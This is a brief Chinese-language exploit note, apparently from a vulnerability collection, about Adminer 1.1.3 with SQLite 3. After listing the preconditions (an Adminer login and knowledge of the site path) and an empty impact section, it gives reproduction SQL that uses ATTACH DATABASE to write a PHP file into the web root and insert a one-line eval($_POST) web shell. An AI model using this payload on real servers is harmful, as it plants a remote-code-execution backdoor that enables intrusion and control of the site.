Adminers 1.1.3 （SQLite 3 写入一句话木马）
==========================================

一、漏洞简介
------------

需要登陆Adminers，并且需要知道网站的路径。

二、漏洞影响
------------

三、复现过程
------------

    ATTACH DATABASE 'z.php' AS t;create TABLE t.e (d text);/*

    ATTACH DATABASE '/网站/路径/shell.php' AS t;insert INTO t.e (d) VALUES ('<?php eval($_POST[a])?>');/*
